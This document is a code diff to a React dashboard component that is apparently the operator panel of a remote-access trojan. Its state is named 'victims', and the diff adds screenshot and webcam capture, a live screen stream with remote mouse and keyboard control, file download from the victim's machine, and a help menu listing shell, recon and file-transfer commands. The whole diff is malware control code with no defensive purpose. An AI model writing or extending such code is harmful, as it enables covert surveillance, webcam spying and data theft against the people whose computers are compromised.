@@ -143,6 +143,8 @@ export function DashboardContainer({
   const [victims, setVictims] = useState<Victim[]>(initialVictims);
   const [selected, setSelected] = useState<Victim | null>(null);
   const [output, setOutput] = useState<string[]>([]);
+  const [liveViewActive, setLiveViewActive] = useState(false);
+  const [liveFrame, setLiveFrame] = useState<string | null>(null);
   const [loading, setLoading] = useState(initialVictims.length === 0);
   const [search, setSearch] = useState("");
   const hasInitialData = useRef(initialVictims.length > 0);
@@ -187,6 +189,40 @@ export function DashboardContainer({
         }
       } else if (msg.type === "shell_output") {
         setOutput((p) => [...p, msg.output ?? ""]);
+      } else if (msg.type === "screenshot_result") {
+        if (msg.error) {
+          setOutput((p) => [...p, `[screenshot error] ${msg.error}`]);
+        } else {
+          setOutput((p) => [
+            ...p,
+            `[screenshot] Captured from ${msg.id}`,
+            `%%IMG%%${msg.data}`,
+          ]);
+        }
+      } else if (msg.type === "download_result") {
+        if (msg.error) {
+          setOutput((p) => [...p, `[download error] ${msg.error}`]);
+        } else {
+          setOutput((p) => [
+            ...p,
+            `[file] ${msg.filename} (${msg.size} bytes)`,
+            `%%FILE%%${msg.filename}%%${msg.data}`,
+          ]);
+        }
+      } else if (msg.type === "webcam_result") {
+        if (msg.error) {
+          setOutput((p) => [...p, `[webcam error] ${msg.error}`]);
+        } else {
+          setOutput((p) => [
+            ...p,
+            `[webcam] Captured from ${msg.id}`,
+            `%%IMG%%${msg.data}`,
+          ]);
+        }
+      } else if (msg.type === "screen_frame") {
+        if (!msg.error) {
+          setLiveFrame(msg.data ?? null);
+        }
       }
     } catch {}
   }, [lastMessage, loadVictims, selected]);
@@ -198,13 +234,79 @@ export function DashboardContainer({
   function handleSelect(victim: Victim) {
     setSelected(victim);
     setOutput([]);
+    setLiveViewActive(false);
+    setLiveFrame(null);
+  }
+
+  async function handleRemoteInput(action: string, x: number, y: number, key?: string) {
+    if (!selected) return;
+    const payload = JSON.stringify({ action, x, y, key: key ?? "", button: "left" });
+    try {
+      await sendCommand(selected.id, payload, token ?? undefined, "remote_input");
+    } catch {}
   }
 
   async function handleCommand(cmd: string) {
     if (!selected) return;
     setOutput((p) => [...p, `$ ${cmd}`]);
+
+    // Parse special commands
+    const trimmed = cmd.trim().toLowerCase();
+    let commandType = "shell";
+    let payload = cmd;
+
+    if (trimmed === "cmds" || trimmed === "help" || trimmed === "?") {
+      setOutput((p) => [
+        ...p,
+        "┌──────────────────────────────────────────────────────┐",
+        "│                  Available Commands                  │",
+        "├──────────────────────────────────────────────────────┤",
+        "│  Shell                                               │",
+        "│    <any command>     Run a shell command (cmd/bash)   │",
+        "│    cd <path>         Change working directory         │",
+        "│                                                      │",
+        "│  Recon                                                │",
+        "│    screenshot        Capture screen (PNG)             │",
+        "│    webcam            Capture webcam photo (PNG)       │",
+        "│                                                      │",
+        "│  Streaming                                            │",
+        "│    liveview          Toggle live screen stream (JPEG) │",
+        "│                      Click on stream to send input    │",
+        "│                                                      │",
+        "│  File Transfer                                        │",
+        "│    download <path>   Download a file from victim      │",
+        "│                                                      │",
+        "│  Meta                                                 │",
+        "│    cmds / help / ?   Show this help message           │",
+        "└──────────────────────────────────────────────────────┘",
+      ]);
+      return;
+    } else if (trimmed === "screenshot") {
+      commandType = "screenshot";
+      payload = "";
+    } else if (trimmed === "webcam") {
+      commandType = "webcam";
+      payload = "";
+    } else if (trimmed === "liveview" || trimmed === "live") {
+      if (liveViewActive) {
+        commandType = "screen_stream_stop";
+        payload = "";
+        setLiveViewActive(false);
+        setLiveFrame(null);
+        setOutput((p) => [...p, "[live view] Stopped"]);
+      } else {
+        commandType = "screen_stream_start";
+        payload = "";
+        setLiveViewActive(true);
+        setOutput((p) => [...p, "[live view] Starting... Type 'liveview' again to stop"]);
+      }
+    } else if (trimmed.startsWith("download ")) {
+      commandType = "download";
+      payload = cmd.trim().substring(9);
+    }
+
     try {
-      await sendCommand(selected.id, cmd, token ?? undefined);
+      await sendCommand(selected.id, payload, token ?? undefined, commandType);
     } catch {
       setOutput((p) => [...p, "[error] Command delivery failed"]);
     }
@@ -406,6 +508,9 @@ export function DashboardContainer({
                 output={output}
                 onCommand={handleCommand}
                 onClear={() => setOutput([])}
+                liveViewActive={liveViewActive}
+                liveFrame={liveFrame}
+                onRemoteInput={handleRemoteInput}
               />
             ) : (
               <div className={styles.empty}>
